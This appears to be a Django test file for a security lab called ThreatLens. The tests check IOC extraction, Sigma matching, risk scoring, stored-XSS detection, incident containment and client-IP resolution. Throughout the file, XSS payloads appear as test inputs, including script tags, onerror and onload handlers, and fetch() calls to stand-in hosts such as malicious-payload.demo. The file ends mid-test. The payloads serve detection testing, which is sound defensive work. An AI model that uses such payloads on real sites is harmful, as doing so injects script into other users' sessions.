import json
from django.test import TestCase, Client, override_settings
from django.urls import reverse
from django.utils import timezone

from tracker.models import SpyUser, Campaign, Member, SurveillanceRequest
from security_monitoring.models import SecurityLabPayload, SecurityEvent, IOC, SecurityIncident
from security_monitoring.services.extractor import (
    extract_ips, extract_urls, extract_domains, extract_hashes,
    extract_payload_patterns, inspect_user_agent, extract_all_iocs
)
from security_monitoring.services.normalizer import (
    normalize_ip, normalize_domain, normalize_url, normalize_hash,
    normalize_and_deduplicate, normalize_for_inspection
)
from security_monitoring.services.detector import inspect_request, evaluate_string_for_threats
from security_monitoring.services.enrichment import enrich_indicator
from security_monitoring.services.scoring import calculate_risk_score
from security_monitoring.services.sigma import load_all_rules, evaluate_sigma_rules
from security_monitoring.services.parser import process_security_telemetry
from security_monitoring.services.response import take_action_contain, reset_security_lab, verify_active_rendering_state



class IOCTestCase(TestCase):
    def test_ipv4_extraction_and_rejection(self):
        sample = "Target reached from 192.168.1.50 and 203.0.113.50, but 999.999.999.999 and 1.2.3.400 are invalid."
        ips = extract_ips(sample)
        self.assertIn("192.168.1.50", ips)
        self.assertIn("203.0.113.50", ips)
        self.assertNotIn("999.999.999.999", ips)
        self.assertNotIn("1.2.3.400", ips)

    def test_url_and_domain_extraction(self):
        sample = "Payload loaded from https://malicious-payload.demo/exploit.js?v=2 and HTTP://EVIL-CDN.EXAMPLE.ORG:80/payload"
        urls = extract_urls(sample)
        self.assertEqual(len(urls), 2)
        
        domains = extract_domains(sample)
        self.assertIn("malicious-payload.demo", domains)
        self.assertIn("evil-cdn.example.org", [d.lower() for d in domains])

    def test_hash_extraction(self):
        sample = "MD5: 5d41402abc4b2a76b9719d911017c592 and SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        hashes = extract_hashes(sample)
        hash_types = [h["hash_type"] for h in hashes]
        hash_values = [h["value"] for h in hashes]
        self.assertIn("MD5", hash_types)
        self.assertIn("SHA256", hash_types)
        self.assertIn("5d41402abc4b2a76b9719d911017c592", hash_values)
        self.assertIn("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", hash_values)

    def test_normalization_and_deduplication(self):
        raw_list = [
            {"ioc_type": "DOMAIN", "value": "EXAMPLE.COM."},
            {"ioc_type": "DOMAIN", "value": "example.com"},
            {"ioc_type": "URL", "value": "HTTP://EXAMPLE.COM:80/path//to/file?a=1#frag"},
            {"ioc_type": "URL", "value": "http://example.com/path/to/file?a=1"},
            {"ioc_type": "IP", "value": " 203.0.113.50 "},
            {"ioc_type": "IP", "value": "203.0.113.50"},
            {"ioc_type": "HASH", "value": "5D41402ABC4B2A76B9719D911017C592"},
            {"ioc_type": "HASH", "value": "5d41402abc4b2a76b9719d911017c592"},
        ]
        deduped = normalize_and_deduplicate(raw_list)
        # Should deduplicate down to 4 items: 1 domain, 1 url, 1 ip, 1 hash
        types = [d["ioc_type"] for d in deduped]
        self.assertEqual(types.count("DOMAIN"), 1)
        self.assertEqual(types.count("URL"), 1)
        self.assertEqual(types.count("IP"), 1)
        self.assertEqual(types.count("HASH"), 1)

    def test_enrichment_known_and_unknown(self):
        # Known demo malicious IP
        known = enrich_indicator("IP", "203.0.113.50")
        self.assertEqual(known["reputation"], "MALICIOUS")
        self.assertGreaterEqual(known["confidence"], 90)
        self.assertEqual(known["enrichment"]["status"], "Enriched")

        # Unknown IP
        unknown = enrich_indicator("IP", "192.0.2.1")
        self.assertEqual(unknown["reputation"], "UNKNOWN")
        self.assertLessEqual(unknown["confidence"], 20)


class ScoringAndSigmaTestCase(TestCase):
    def test_risk_scoring_boundaries_and_rules(self):
        # Clean benign input
        score_clean, sev_clean, _ = calculate_risk_score(
            payload_text="benign input",
            enriched_iocs=[],
            user_agent="Mozilla/5.0"
        )
        self.assertEqual(score_clean, 0)
        self.assertEqual(sev_clean, "LOW")

        # Malicious demo payload
        iocs = [
            {"ioc_type": "PAYLOAD_PATTERN", "normalized_value": "DEMO_VIDEO_PAYLOAD", "reputation": "MALICIOUS"},
            {"ioc_type": "IP", "normalized_value": "203.0.113.50", "reputation": "MALICIOUS"},
        ]
        score_high, sev_high, breakdown = calculate_risk_score(
            payload_text="<script>/* DEMO_VIDEO_PAYLOAD */</script>",
            enriched_iocs=iocs,
            user_agent="python-requests/2.28 (xss-scanner)",
            event_count_recent=2
        )
        self.assertGreaterEqual(score_high, 80)
        self.assertEqual(sev_high, "CRITICAL")
        self.assertTrue(any("Stored-XSS" in b["rule"] for b in breakdown))
        self.assertTrue(any("Correlated Malicious Indicators" in b["rule"] for b in breakdown))

    def test_sigma_rules_loading_and_matching(self):
        rules = load_all_rules()
        self.assertGreaterEqual(len(rules), 1)

        primary_rule = None
        for r in rules:
            if "Stored XSS Detection" in r.get("title", ""):
                primary_rule = r
                break
        self.assertIsNotNone(primary_rule)
        self.assertIn("detection", primary_rule)
        self.assertIn("level", primary_rule)
        self.assertIn("id", primary_rule)

        # Test event matching
        demo_event = {
            "event_type": "stored_xss_detected",
            "method": "POST",
            "path": "/dispatch/",
            "user_agent": "ThreatLens-Scanner",
            "source_ip": "203.0.113.50"
        }
        matches = evaluate_sigma_rules(demo_event)
        self.assertGreaterEqual(len(matches), 1)
        self.assertEqual(matches[0]["title"], "Stored XSS Detection")


class SecurityLabWorkflowTestCase(TestCase):
    def setUp(self):
        self.client = Client()
        self.admin_user = SpyUser.objects.create(
            player_id=1001,
            player_name="LeadAnalyst",
            api_key="test_api_key_admin",
            is_admin=True
        )
        self.normal_user = SpyUser.objects.create(
            player_id=2002,
            player_name="StandardOperative",
            api_key="test_api_key_user",
            is_admin=False
        )

    def test_security_lab_disabled_flag(self):
        with override_settings(SECURITY_MONITORING_ENABLED=False):
            response = self.client.get(reverse("xss_demo"))
            self.assertEqual(response.status_code, 404)

            response_soc = self.client.get(reverse("soc_dashboard"))
            self.assertEqual(response_soc.status_code, 404)

    def test_admin_authorization_for_soc(self):
        # 1. Unauthenticated -> redirects to login
        response = self.client.get(reverse("soc_dashboard"))
        self.assertEqual(response.status_code, 302)
        self.assertIn(reverse("login"), response.url)

        # 2. Authenticated as non-admin -> 403 Forbidden
        session = self.client.session
        session["spy_user_id"] = self.normal_user.id
        session.save()
        response_non_admin = self.client.get(reverse("soc_dashboard"))
        self.assertEqual(response_non_admin.status_code, 403)

        # 3. Authenticated as admin -> 200 OK
        session["spy_user_id"] = self.admin_user.id
        session.save()
        response_admin = self.client.get(reverse("soc_dashboard"))
        self.assertEqual(response_admin.status_code, 200)


    def test_shared_rendering_and_containment_across_sessions(self):
        client_a = Client()
        client_b = Client()

        # Step 1: Initial clean state
        resp_a1 = client_a.get(reverse("xss_demo"))
        self.assertEqual(resp_a1.status_code, 200)
        self.assertFalse(resp_a1.context["has_active_payload"])
        self.assertNotContains(resp_a1, "fbi-breaking-door.gif")

        # Step 2: Attacker launches controlled attack
        attack_resp = client_a.post(
            reverse("xss_demo"),
            {
                "payload": "<script>/* DEMO_VIDEO_PAYLOAD */ fetch('http://malicious-payload.demo/exploit.js');</script>",
            }
        )
        self.assertEqual(attack_resp.status_code, 302)

        # Step 3: Verify shared rendering impact for both sessions
        resp_a2 = client_a.get(reverse("xss_demo"))
        self.assertTrue(resp_a2.context["has_active_payload"])
        self.assertContains(resp_a2, "fbi-breaking-door.gif")

        resp_b2 = client_b.get(reverse("xss_demo"))
        self.assertTrue(resp_b2.context["has_active_payload"])
        self.assertContains(resp_b2, "fbi-breaking-door.gif")

        # Step 4: Verify incident created in SOC
        incident = SecurityIncident.objects.filter(status="OPEN").latest("created_at")
        self.assertEqual(incident.source_ip, "127.0.0.1")
        self.assertGreaterEqual(incident.risk_score, 80)
        self.assertEqual(incident.matched_sigma_rule, "Stored XSS Detection")

        # Step 5: Analyst executes TAKE ACTION containment
        session = client_a.session
        session["spy_user_id"] = self.admin_user.id
        session.save()

        contain_resp = client_a.post(
            reverse("take_action", kwargs={"incident_id": incident.id})
        )
        self.assertEqual(contain_resp.status_code, 302)

        # Step 6: Verify containment state
        incident.refresh_from_db()
        self.assertEqual(incident.status, "CONTAINED")
        self.assertTrue(incident.containment_verified)
        self.assertIsNotNone(incident.action_taken_at)
        self.assertEqual(SecurityLabPayload.objects.count(), 0)
        # The incident remains and retains the captured payload as forensic evidence.
        self.assertIn("<script>", incident.payload)

        # Step 7: Verify malicious overlay is gone for all sessions
        resp_a3 = client_a.get(reverse("xss_demo"))
        self.assertFalse(resp_a3.context["has_active_payload"])
        self.assertNotContains(resp_a3, "fbi-breaking-door.gif")

        resp_b3 = client_b.get(reverse("xss_demo"))
        self.assertFalse(resp_b3.context["has_active_payload"])
        self.assertNotContains(resp_b3, "fbi-breaking-door.gif")

        # Step 8: Idempotency of TAKE ACTION
        second_action = take_action_contain(incident.id, self.admin_user)
        self.assertTrue(second_action["success"])
        self.assertTrue(second_action.get("idempotent"))

    def test_reset_lab_preserves_torn_data(self):
        # Create existing Torn data
        campaign = Campaign.objects.create(
            faction_id=5555,
            faction_name="Alpha Faction",
            owner=self.admin_user,
            active=True
        )
        member = Member.objects.create(
            campaign=campaign,
            player_id=9999,
            name="TargetPlayer"
        )
        request_rec = SurveillanceRequest.objects.create(
            user=self.normal_user,
            faction_id="5555",
            status="PENDING"
        )

        # Create security demo records
        payload = SecurityLabPayload.objects.create(
            payload="DEMO_VIDEO_PAYLOAD",
            status="ACTIVE"
        )
        event = SecurityEvent.objects.create(
            event_type="stored_xss_detected",
            source_ip="203.0.113.50"
        )
        ioc = IOC.objects.create(
            value="203.0.113.50",
            ioc_type="IP",
            source_event=event,
            normalized_value="203.0.113.50"
        )
        incident = SecurityIncident.objects.create(
            title="Demo Incident",
            severity="HIGH",
            status="OPEN",
            event=event
        )

        # Execute Reset
        reset_security_lab()

        # Security lab records should be wiped
        self.assertEqual(SecurityIncident.objects.count(), 0)
        self.assertEqual(IOC.objects.count(), 0)
        self.assertEqual(SecurityEvent.objects.count(), 0)
        self.assertEqual(SecurityLabPayload.objects.count(), 0)

        # Existing Torn data must be 100% untouched!
        self.assertEqual(SpyUser.objects.count(), 2)
        self.assertEqual(Campaign.objects.count(), 1)
        self.assertEqual(Member.objects.count(), 1)
        self.assertEqual(SurveillanceRequest.objects.count(), 1)


class AutomaticThreatDetectionTestCase(TestCase):
    def setUp(self):
        self.client = Client()
        self.admin = SpyUser.objects.create(
            player_id=5001,
            player_name="SOCAdmin",
            api_key="admin_key",
            is_admin=True
        )

    def test_security_normalization_stages(self):
        # 1. Multi-pass URL decoding
        multi_encoded = "%253Cscript%253E"
        norm1 = normalize_for_inspection(multi_encoded)
        self.assertIn("<script>", norm1)

        # 2. HTML entity unescaping
        html_entities = "&lt;img src=x onerror=alert(1)&gt;"
        norm2 = normalize_for_inspection(html_entities)
        self.assertIn("<img src=x onerror=alert(1)>", norm2)

        # 3. Unicode and Hex escapes
        escaped_input = r"\u003cscript\u003ealert('test')\x3c/script\x3e"
        norm3 = normalize_for_inspection(escaped_input)
        self.assertIn("<script>", norm3)
        self.assertIn("</script>", norm3)

        # 4. Mixed case normalization
        mixed = "<ScRiPt OnLoAd=AlErT(1)>"
        norm4 = normalize_for_inspection(mixed)
        self.assertEqual(norm4, "<script onload=alert(1)>")

    def test_automatic_detection_on_normal_field_names(self):
        # Test attack submitted through 'directive' (no 'payload' field)
        resp = self.client.post(
            reverse("xss_demo"),
            {"directive": "<img src=x onerror=alert('xss')>", "callsign": "TARGET_A"}
        )
        self.assertEqual(resp.status_code, 302)

        # Verify incident automatically created
        incident = SecurityIncident.objects.latest("created_at")
        self.assertEqual(incident.status, "OPEN")
        self.assertIn("onerror=", incident.payload)
        self.assertGreaterEqual(incident.risk_score, 50)
        self.assertEqual(incident.matched_sigma_rule, "Stored XSS Detection")

        # Verify timeline milestones recorded
        timeline = incident.event.raw_event.get("timeline", {})
        self.assertIn("request_received", timeline)
        self.assertIn("detection_triggered", timeline)
        self.assertIn("incident_created", timeline)

    def test_clean_request_does_not_create_incident(self):
        # Clean business directive
        initial_incident_count = SecurityIncident.objects.count()
        resp = self.client.post(
            reverse("xss_demo"),
            {"directive": "Regular sector check completed. Sector is quiet.", "callsign": "PATROL_ALPHA"}
        )
        self.assertEqual(resp.status_code, 302)
        self.assertEqual(SecurityIncident.objects.count(), initial_incident_count)
        self.assertFalse(SecurityLabPayload.objects.filter(status="ACTIVE").exists())

    def test_soc_polling_endpoint(self):
        # Authenticate admin
        session = self.client.session
        session["spy_user_id"] = self.admin.id
        session.save()

        # Generate incident via normal endpoint
        self.client.post(
            reverse("xss_demo"),
            {"notes": "<svg/onload=alert('threat')>"}
        )

        # Poll endpoint
        poll_resp = self.client.get(reverse("soc_poll"))
        self.assertEqual(poll_resp.status_code, 200)
        data = poll_resp.json()
        self.assertEqual(data["status"], "ok")
        self.assertGreater(data["latest_incident_id"], 0)
        self.assertEqual(data["total_open"], 1)
        self.assertEqual(data["active_payload_count"], 1)
        self.assertTrue(data["is_compromised"])

        # Poll endpoint when no open incidents exist (tests fallback to latest_any)
        inc = SecurityIncident.objects.latest("created_at")
        inc.status = "CONTAINED"
        inc.save()
        poll_resp2 = self.client.get(reverse("soc_poll"))
        self.assertEqual(poll_resp2.status_code, 200)
        data2 = poll_resp2.json()
        self.assertEqual(data2["total_open"], 0)
        self.assertEqual(data2["latest_incident_id"], inc.id)

    def test_containment_verification_and_persistence(self):
        # 1. Trigger incident
        self.client.post(
            reverse("xss_demo"),
            {"directive": "<script>/* DEMO_VIDEO_PAYLOAD */ alert('eval')</script>"}
        )
        incident = SecurityIncident.objects.latest("created_at")
        self.assertEqual(SecurityLabPayload.objects.filter(status="ACTIVE").count(), 1)

        # 2. Authenticate admin and contain
        session = self.client.session
        session["spy_user_id"] = self.admin.id
        session.save()

        action_resp = self.client.post(
            reverse("take_action", kwargs={"incident_id": incident.id})
        )
        self.assertEqual(action_resp.status_code, 302)

        # 3. Verify containment result
        incident.refresh_from_db()
        self.assertEqual(incident.status, "CONTAINED")
        self.assertTrue(incident.containment_verified)
        self.assertIn("Payload active: NO", incident.action_result)
        self.assertIn("Active rendering record: NOT FOUND", incident.action_result)
        self.assertIn("Containment: VERIFIED", incident.action_result)

        # 4. Forensic evidence preserved
        self.assertIn("<script>", incident.payload)
        self.assertIsNotNone(incident.event)
        self.assertEqual(SecurityLabPayload.objects.filter(status="ACTIVE").count(), 0)

    def test_surveillance_request_payload_active_until_deleted(self):
        """
        Verifies that a payload submitted into SurveillanceRequest remains ACTIVE
        in the UI / database monitor until the request is deleted via TAKE ACTION.
        """
        # Create a legitimate numeric request that must NEVER be deleted
        legit_req = SurveillanceRequest.objects.create(
            user=self.admin,
            faction_id="54815",
            status="PENDING"
        )

        # Authenticate operative
        session = self.client.session
        session["spy_user_id"] = self.admin.id
        session.save()

        # Submit attack through surveillance request creation form
        malicious_vector = "<script>/* DEMO_VIDEO_PAYLOAD */ alert('surveillance_vector')</script>"
        resp = self.client.post(
            reverse("create_request"),
            {"faction_id": malicious_vector}
        )
        self.assertEqual(resp.status_code, 302)

        # Verify SurveillanceRequest was stored in database
        malicious_req = SurveillanceRequest.objects.filter(faction_id__contains="surveillance_vector").first()
        self.assertIsNotNone(malicious_req)

        # Verify incident was automatically created and linked
        incident = SecurityIncident.objects.latest("created_at")
        self.assertEqual(incident.status, "OPEN")
        self.assertIn("surveillance_vector", incident.payload)

        # CRITICAL TEST: Active rendering state MUST report compromised=True
        # because the malicious request is STILL in the database!
        state = verify_active_rendering_state()
        self.assertTrue(state["is_compromised"])
        self.assertGreaterEqual(state["active_surveillance_requests_count"], 1)

        # SOC poll endpoint must also report compromised
        poll_resp = self.client.get(reverse("soc_poll"))
        self.assertEqual(poll_resp.status_code, 200)
        self.assertTrue(poll_resp.json()["is_compromised"])

        # Execute TAKE ACTION containment
        action_resp = self.client.post(
            reverse("take_action", kwargs={"incident_id": incident.id})
        )
        self.assertEqual(action_resp.status_code, 302)

        # Verify malicious SurveillanceRequest has been DELETED from the database
        self.assertFalse(
            SurveillanceRequest.objects.filter(faction_id__contains="surveillance_vector").exists()
        )

        # Verify legitimate numeric request is PRESERVED
        self.assertTrue(
            SurveillanceRequest.objects.filter(id=legit_req.id).exists()
        )

        # Verify state is now CLEAN
        post_state = verify_active_rendering_state()
        self.assertFalse(post_state["is_compromised"])
        self.assertEqual(post_state["active_surveillance_requests_count"], 0)

        # Verify incident containment result
        incident.refresh_from_db()
        self.assertEqual(incident.status, "CONTAINED")
        self.assertTrue(incident.containment_verified)
        self.assertIn("Payload active: NO", incident.action_result)
        self.assertIn("Active rendering record: NOT FOUND", incident.action_result)
        self.assertIn("Containment: VERIFIED", incident.action_result)
        self.assertIn("SurveillanceRequest", incident.action_result)

        # Forensic evidence remains retained on incident
        self.assertIn("surveillance_vector", incident.payload)



# ---------------------------------------------------------------------------
# Spec Section 25 — additional tests
# ---------------------------------------------------------------------------

class ExactLinkingTestCase(TestCase):
    """
    Tests that SecurityEvent / SecurityIncident link to the exact SurveillanceRequest
    primary key and that no fuzzy payload lookup is used.
    """

    def setUp(self):
        self.client = Client()
        self.admin = SpyUser.objects.create(
            player_id=7001,
            player_name="LinkAnalyst",
            api_key="link_key",
            is_admin=True,
        )
        session = self.client.session
        session["spy_user_id"] = self.admin.id
        session.save()

    def test_incident_links_exact_surveillance_request_pk(self):
        """
        After submitting a malicious faction_id through create_request,
        the resulting incident must reference the exact SurveillanceRequest PK.
        """
        malicious = "<img src=x onerror=fetch('http://evil.example.com')>"
        self.client.post(reverse("create_request"), {"faction_id": malicious})

        sr = SurveillanceRequest.objects.filter(faction_id=malicious).first()
        self.assertIsNotNone(sr, "SurveillanceRequest should have been created")

        incident = SecurityIncident.objects.latest("created_at")
        self.assertEqual(
            incident.surveillance_request_id, sr.id,
            "Incident must reference the exact SurveillanceRequest PK — no fuzzy match",
        )

    def test_unrelated_requests_remain_unrelated(self):
        """
        A legitimate request created independently must never be linked to an incident.
        """
        legit = SurveillanceRequest.objects.create(
            user=self.admin, faction_id="99999", status="PENDING"
        )

        self.client.post(
            reverse("xss_demo"),
            {"directive": "<script>alert(1)</script>"},
        )

        incident = SecurityIncident.objects.latest("created_at")
        # The incident must NOT reference the unrelated legitimate request
        self.assertNotEqual(incident.surveillance_request_id, legit.id)

    def test_no_fuzzy_payload_lookup_on_contain(self):
        """
        TAKE ACTION must only delete the exact linked SurveillanceRequest.
        A second unrelated SurveillanceRequest with similar content must survive.
        """
        # Create an unrelated SR that happens to contain XSS-looking text
        # (simulates a coincidental match that old fuzzy code would delete)
        bystander = SurveillanceRequest.objects.create(
            user=self.admin,
            faction_id="<b>bold text not malicious</b>",
            status="PENDING",
        )

        malicious = "<svg onload=alert('exact')>"
        self.client.post(reverse("create_request"), {"faction_id": malicious})

        incident = SecurityIncident.objects.latest("created_at")
        linked_sr_id = incident.surveillance_request_id
        self.assertIsNotNone(linked_sr_id)

        # Contain
        self.client.post(reverse("take_action", kwargs={"incident_id": incident.id}))

        # Linked SR deleted
        self.assertFalse(SurveillanceRequest.objects.filter(id=linked_sr_id).exists())
        # Bystander MUST still exist
        self.assertTrue(
            SurveillanceRequest.objects.filter(id=bystander.id).exists(),
            "Unrelated SurveillanceRequest must not be deleted by TAKE ACTION",
        )


class TakeActionExactnessTestCase(TestCase):
    """Tests that TAKE ACTION is precise, idempotent, and forensically sound."""

    def setUp(self):
        self.client = Client()
        self.admin = SpyUser.objects.create(
            player_id=8001,
            player_name="ActionAnalyst",
            api_key="action_key",
            is_admin=True,
        )
        session = self.client.session
        session["spy_user_id"] = self.admin.id
        session.save()

    def _trigger_incident_via_create_request(self, payload_str):
        self.client.post(reverse("create_request"), {"faction_id": payload_str})
        return SecurityIncident.objects.latest("created_at")

    def test_take_action_deletes_only_associated_request(self):
        unrelated = SurveillanceRequest.objects.create(
            user=self.admin, faction_id="12345", status="PENDING"
        )
        incident = self._trigger_incident_via_create_request(
            "<script>malicious_unique_token</script>"
        )
        linked_id = incident.surveillance_request_id
        self.assertIsNotNone(linked_id)

        self.client.post(reverse("take_action", kwargs={"incident_id": incident.id}))

        self.assertFalse(SurveillanceRequest.objects.filter(id=linked_id).exists())
        self.assertTrue(SurveillanceRequest.objects.filter(id=unrelated.id).exists())

    def test_take_action_is_idempotent(self):
        incident = self._trigger_incident_via_create_request(
            "<img onerror=x src=y>"
        )
        # First action
        r1 = take_action_contain(incident.id, self.admin)
        self.assertTrue(r1["success"])
        self.assertFalse(r1.get("idempotent", False))

        # Second action — must be idempotent
        r2 = take_action_contain(incident.id, self.admin)
        self.assertTrue(r2["success"])
        self.assertTrue(r2.get("idempotent", False))

    def test_incident_remains_after_take_action(self):
        incident = self._trigger_incident_via_create_request(
            "<iframe src=javascript:alert(1)></iframe>"
        )
        incident_id = incident.id
        self.client.post(reverse("take_action", kwargs={"incident_id": incident_id}))

        # Incident record must still exist with forensic payload
        incident.refresh_from_db()
        self.assertEqual(incident.status, "CONTAINED")
        self.assertTrue(SecurityIncident.objects.filter(id=incident_id).exists())
        self.assertIsNotNone(incident.payload)

    def test_containment_verification_recorded(self):
        incident = self._trigger_incident_via_create_request(
            "<script>javascript:void(0)</script>"
        )
        self.client.post(reverse("take_action", kwargs={"incident_id": incident.id}))

        incident.refresh_from_db()
        self.assertTrue(incident.containment_verified)
        self.assertIn("Containment: VERIFIED", incident.action_result)
        self.assertIn("SurveillanceRequest", incident.action_result)


class SigmaAccuracyTestCase(TestCase):
    """Sigma rules must match only when the event actually fits the rule."""

    def test_matching_event_returns_matched(self):
        matches = evaluate_sigma_rules({
            "event_type": "stored_xss_detected",
            "method": "POST",
            "path": "/dispatch/",
        })
        titles = [m["title"] for m in matches]
        self.assertIn("Stored XSS Detection", titles)

    def test_non_matching_event_returns_not_matched(self):
        matches = evaluate_sigma_rules({
            "event_type": "benign_form_submission",
            "method": "GET",
            "path": "/home/",
        })
        stored_xss_matches = [m for m in matches if m["title"] == "Stored XSS Detection"]
        self.assertEqual(len(stored_xss_matches), 0)


class IOCRealExtractionTestCase(TestCase):
    """IOC extraction must produce only indicators actually present in the event."""

    def test_ip_extracted_from_source_ip(self):
        raw = [{"ioc_type": "IP", "value": "10.0.0.5"}]
        deduped = normalize_and_deduplicate(raw)
        self.assertEqual(len(deduped), 1)
        self.assertEqual(deduped[0]["normalized_value"], "10.0.0.5")

    def test_no_fabricated_iocs_for_benign_event(self):
        iocs = extract_all_iocs({
            "source_ip": "127.0.0.1",
            "payload": "regular surveillance update",
            "path": "/requests/create/",
            "method": "POST",
            "user_agent": "Mozilla/5.0",
        })
        # Should only find 127.0.0.1 as IP — no domains, URLs, or payload patterns
        ioc_types = [i["ioc_type"] for i in iocs]
        self.assertNotIn("PAYLOAD_PATTERN", ioc_types)
        self.assertNotIn("URL", ioc_types)

    def test_ioc_deduplication_prevents_duplicates(self):
        raw = [
            {"ioc_type": "IP", "value": "192.168.1.1"},
            {"ioc_type": "IP", "value": "192.168.1.1"},
            {"ioc_type": "IP", "value": " 192.168.1.1 "},
        ]
        deduped = normalize_and_deduplicate(raw)
        self.assertEqual(len(deduped), 1)


class EndToEndPipelineTestCase(TestCase):
    """
    Full end-to-end test: external crafted request → SurveillanceRequest →
    automatic detection → SecurityEvent → IOC extraction → normalization →
    enrichment → risk score → Sigma → SecurityIncident → SOC → TAKE ACTION →
    exact SR deleted → containment verified.
    """

    def setUp(self):
        self.client = Client()
        self.admin = SpyUser.objects.create(
            player_id=9001,
            player_name="E2EAnalyst",
            api_key="e2e_key",
            is_admin=True,
        )
        session = self.client.session
        session["spy_user_id"] = self.admin.id
        session.save()

    def test_full_pipeline(self):
        # 1. No prior incidents
        self.assertEqual(SecurityIncident.objects.count(), 0)

        # 2. Operator submits crafted payload through normal application path
        malicious = "<script>/* DEMO_VIDEO_PAYLOAD */ fetch('http://malicious-payload.demo/exploit.js');</script>"
        self.client.post(reverse("create_request"), {"faction_id": malicious})

        # 3. SurveillanceRequest created
        sr = SurveillanceRequest.objects.filter(faction_id=malicious).first()
        self.assertIsNotNone(sr)

        # 4. Automatic detection fired → SecurityEvent created
        self.assertEqual(SecurityEvent.objects.count(), 1)
        event = SecurityEvent.objects.latest("created_at")
        self.assertEqual(event.event_type, "stored_xss_detected")

        # 5. IOC extraction ran — at least one IOC exists
        self.assertGreater(IOC.objects.count(), 0)

        # 6. SecurityIncident created and linked to exact SR
        self.assertEqual(SecurityIncident.objects.count(), 1)
        incident = SecurityIncident.objects.latest("created_at")
        self.assertEqual(incident.status, "OPEN")
        self.assertEqual(incident.surveillance_request_id, sr.id)
        self.assertGreater(incident.risk_score, 0)
        self.assertIsNotNone(incident.matched_sigma_rule)
        self.assertEqual(incident.event_id, event.id)

        # 7. SOC rendering state is compromised
        state = verify_active_rendering_state()
        self.assertTrue(state["is_compromised"])

        # 8. TAKE ACTION
        self.client.post(reverse("take_action", kwargs={"incident_id": incident.id}))

        # 9. Exact SR deleted
        self.assertFalse(SurveillanceRequest.objects.filter(id=sr.id).exists())

        # 10. Containment verified
        incident.refresh_from_db()
        self.assertEqual(incident.status, "CONTAINED")
        self.assertTrue(incident.containment_verified)

        # 11. Forensic evidence remains
        self.assertIsNotNone(incident.event)
        self.assertIn("DEMO_VIDEO_PAYLOAD", incident.payload)
        self.assertTrue(SecurityIncident.objects.filter(id=incident.id).exists())

        # 12. SOC now clean
        post_state = verify_active_rendering_state()
        self.assertFalse(post_state["is_compromised"])


# ---------------------------------------------------------------------------
# ThreatLens_Real_Client_IP_Fix — tests (Section 15)
# ---------------------------------------------------------------------------

from unittest.mock import patch
from django.test import RequestFactory, override_settings
from security_monitoring.utils import get_client_ip


class ClientIPResolutionTestCase(TestCase):
    """Unit tests for the authoritative get_client_ip() helper."""

    def setUp(self):
        self.factory = RequestFactory()

    def _make_request(self, remote_addr="127.0.0.1", xff=None):
        """Build a minimal GET request with the given META values."""
        request = self.factory.get("/")
        request.META["REMOTE_ADDR"] = remote_addr
        if xff is not None:
            request.META["HTTP_X_FORWARDED_FOR"] = xff
        else:
            request.META.pop("HTTP_X_FORWARDED_FOR", None)
        return request

    # -- Section 15: Local request (no proxy) --------------------------------

    @override_settings(TRUSTED_PROXY_COUNT=0)
    def test_local_no_proxy_returns_remote_addr(self):
        """TRUSTED_PROXY_COUNT=0 → always use REMOTE_ADDR, ignore XFF."""
        request = self._make_request(
            remote_addr="127.0.0.1",
            xff="203.0.113.50",  # attacker-supplied; must be ignored
        )
        self.assertEqual(get_client_ip(request), "127.0.0.1")

    @override_settings(TRUSTED_PROXY_COUNT=1)
    def test_local_no_xff_returns_remote_addr(self):
        """Proxy configured but no XFF header → fall back to REMOTE_ADDR."""
        request = self._make_request(remote_addr="127.0.0.1")
        self.assertEqual(get_client_ip(request), "127.0.0.1")

    # -- Section 15: Forwarded request ---------------------------------------

    @override_settings(TRUSTED_PROXY_COUNT=1)
    def test_single_proxy_returns_real_client(self):
        """One trusted proxy: XFF = '<client>', REMOTE_ADDR = proxy."""
        request = self._make_request(
            remote_addr="10.0.0.1",
            xff="203.0.113.99",
        )
        self.assertEqual(get_client_ip(request), "203.0.113.99")

    # -- Section 15: Multiple forwarded addresses ----------------------------

    @override_settings(TRUSTED_PROXY_COUNT=1)
    def test_multiple_xff_entries_picks_correct_client(self):
        """
        XFF = 'realclient, intermediate, trusted-proxy'
        With TRUSTED_PROXY_COUNT=1 we strip 1 from the right → 'intermediate'
        would normally be the first proxy added before ours.  With count=1
        we select index = len(valid) - 1 - 1 = 1, i.e. 'intermediate'.
        """
        request = self._make_request(
            remote_addr="10.255.255.1",
            xff="198.51.100.5, 10.0.0.2, 10.255.255.1",
        )
        # 3 valid entries, TRUSTED_PROXY_COUNT=1 → idx = 3-1-1 = 1 → "10.0.0.2"
        self.assertEqual(get_client_ip(request), "10.0.0.2")

    @override_settings(TRUSTED_PROXY_COUNT=2)
    def test_two_proxy_hops_picks_real_client(self):
        """With two trusted proxy hops, select entry before the trusted tail."""
        request = self._make_request(
            remote_addr="10.1.1.1",
            xff="198.51.100.7, 10.0.0.2, 10.0.0.3",
        )
        # 3 valid, TRUSTED_PROXY_COUNT=2 → idx = 3-2-1 = 0 → "198.51.100.7"
        self.assertEqual(get_client_ip(request), "198.51.100.7")

    # -- Section 15: Invalid header ------------------------------------------

    @override_settings(TRUSTED_PROXY_COUNT=1)
    def test_invalid_xff_falls_back_to_remote_addr(self):
        """XFF contains non-IP garbage → fall back to REMOTE_ADDR."""
        request = self._make_request(
            remote_addr="192.168.1.10",
            xff="not-an-ip, also-bad",
        )
        self.assertEqual(get_client_ip(request), "192.168.1.10")

    @override_settings(TRUSTED_PROXY_COUNT=1)
    def test_mixed_valid_invalid_xff_uses_valid_entry(self):
        """XFF with one valid and one invalid entry — valid entry used."""
        request = self._make_request(
            remote_addr="10.0.0.1",
            xff="not-an-ip, 203.0.113.42",
        )
        # 1 valid entry, TRUSTED_PROXY_COUNT=1 → idx = max(0, 1-1-1)=0 → "203.0.113.42"
        self.assertEqual(get_client_ip(request), "203.0.113.42")

    # -- Section 15: IPv6 ----------------------------------------------------

    @override_settings(TRUSTED_PROXY_COUNT=1)
    def test_ipv6_address_accepted(self):
        """Valid IPv6 addresses must be accepted, not rejected."""
        request = self._make_request(
            remote_addr="::1",
            xff="2001:db8::1",
        )
        self.assertEqual(get_client_ip(request), "2001:db8::1")

    @override_settings(TRUSTED_PROXY_COUNT=0)
    def test_ipv6_remote_addr_accepted(self):
        """IPv6 REMOTE_ADDR is valid when no proxy is configured."""
        request = self._make_request(remote_addr="::1")
        self.assertEqual(get_client_ip(request), "::1")

    # -- Spoofing prevention -------------------------------------------------

    @override_settings(TRUSTED_PROXY_COUNT=1)
    def test_cannot_spoof_ip_by_prepending_to_xff(self):
